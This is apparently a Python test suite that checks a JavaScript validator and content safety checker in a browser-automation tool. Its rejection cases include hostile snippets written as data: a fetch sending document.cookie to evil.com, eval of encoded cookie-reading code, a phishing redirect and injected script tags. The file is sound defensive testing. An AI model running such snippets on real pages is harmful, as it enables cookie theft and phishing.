#!/usr/bin/env python3
"""
Quick test script for JavaScript validation without server dependency
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai.validators.javascript_validator import JavaScriptValidator
from ai.validators.safety_checker import SafetyChecker

def test_javascript_validator():
    """Test the JavaScript validator directly"""
    validator = JavaScriptValidator()
    
    print("🧪 Testing JavaScript Validator")
    print("=" * 50)
    
    test_cases = [
        # Safe code examples
        {
            "name": "Simple DOM query",
            "code": "return document.querySelectorAll('a').length;",
            "should_pass": True
        },
        {
            "name": "Extract text content",
            "code": """
                const headings = document.querySelectorAll('h1, h2, h3');
                return Array.from(headings).map(h => h.textContent.trim());
            """,
            "should_pass": True
        },
        {
            "name": "Get form data",
            "code": """
                const forms = document.querySelectorAll('form');
                return Array.from(forms).map(form => ({
                    action: form.action,
                    method: form.method,
                    fields: Array.from(form.elements).map(el => el.name)
                }));
            """,
            "should_pass": True
        },
        # Dangerous code examples
        {
            "name": "Eval usage",
            "code": "eval('alert(document.cookie)');",
            "should_pass": False
        },
        {
            "name": "External fetch",
            "code": "fetch('https://evil.com/steal', {body: document.cookie});",
            "should_pass": False
        },
        {
            "name": "Cookie theft",
            "code": "document.cookie = 'stolen=true';",
            "should_pass": False
        },
        {
            "name": "Window redirect",
            "code": "window.location.href = 'https://phishing.com';",
            "should_pass": False
        },
        {
            "name": "Create script tag",
            "code": "document.body.appendChild(document.createElement('script'));",
            "should_pass": False
        },
        {
            "name": "InnerHTML injection",
            "code": "document.body.innerHTML = '<script>alert(1)</script>';",
            "should_pass": False
        }
    ]
    
    passed = 0
    failed = 0
    
    for test in test_cases:
        print(f"\n📝 Test: {test['name']}")
        print(f"   Code: {test['code'][:60]}..." if len(test['code']) > 60 else f"   Code: {test['code']}")
        
        is_safe, violations = validator.validate(test['code'])
        expected = test['should_pass']
        
        if is_safe == expected:
            print(f"   ✅ PASSED - is_safe={is_safe} (expected)")
            passed += 1
        else:
            print(f"   ❌ FAILED - is_safe={is_safe}, expected={expected}")
            failed += 1
        
        if violations:
            print(f"   ⚠️  Violations: {violations}")
    
    print(f"\n📊 Summary: {passed} passed, {failed} failed")
    return failed == 0

def test_safety_checker():
    """Test the general safety checker"""
    checker = SafetyChecker()
    
    print("\n\n🧪 Testing Safety Checker")
    print("=" * 50)
    
    test_cases = [
        {
            "name": "Normal JavaScript",
            "content": "const x = document.querySelector('.test');",
            "type": "javascript",
            "should_pass": True
        },
        {
            "name": "Suspicious patterns",
            "content": "password = '12345'; eval(atob('ZG9jdW1lbnQuY29va2ll'));",
            "type": "javascript", 
            "should_pass": False
        },
        {
            "name": "Clean markdown",
            "content": "# Hello World\n\nThis is a test document.",
            "type": "markdown",
            "should_pass": True
        },
        {
            "name": "Markdown with script",
            "content": "# Test\n\n<script>alert(1)</script>",
            "type": "markdown",
            "should_pass": False
        }
    ]
    
    passed = 0
    failed = 0
    
    for test in test_cases:
        print(f"\n📝 Test: {test['name']}")
        
        is_safe, warnings = checker.check_content(test['content'], test['type'])
        expected = test['should_pass']
        
        if is_safe == expected:
            print(f"   ✅ PASSED - is_safe={is_safe} (expected)")
            passed += 1
        else:
            print(f"   ❌ FAILED - is_safe={is_safe}, expected={expected}")
            failed += 1
        
        if warnings:
            print(f"   ⚠️  Warnings: {warnings}")
    
    print(f"\n📊 Summary: {passed} passed, {failed} failed")
    return failed == 0

def test_safe_example():
    """Test the safe example generator"""
    validator = JavaScriptValidator()
    
    print("\n\n🧪 Testing Safe Example Generator")
    print("=" * 50)
    
    safe_example = validator.get_safe_example()
    print("📝 Safe example code:")
    print(safe_example)
    
    is_safe, violations = validator.validate(safe_example)
    
    if is_safe:
        print("\n✅ Safe example passes validation")
    else:
        print(f"\n❌ Safe example failed validation: {violations}")
    
    return is_safe

def main():
    """Run all tests"""
    print("🚀 JavaScript Validation Test Suite")
    print("=" * 60)
    
    all_passed = True
    
    # Run test suites
    all_passed &= test_javascript_validator()
    all_passed &= test_safety_checker()
    all_passed &= test_safe_example()
    
    print("\n" + "=" * 60)
    if all_passed:
        print("✅ All tests passed!")
        return 0
    else:
        print("❌ Some tests failed!")
        return 1

if __name__ == "__main__":
    sys.exit(main())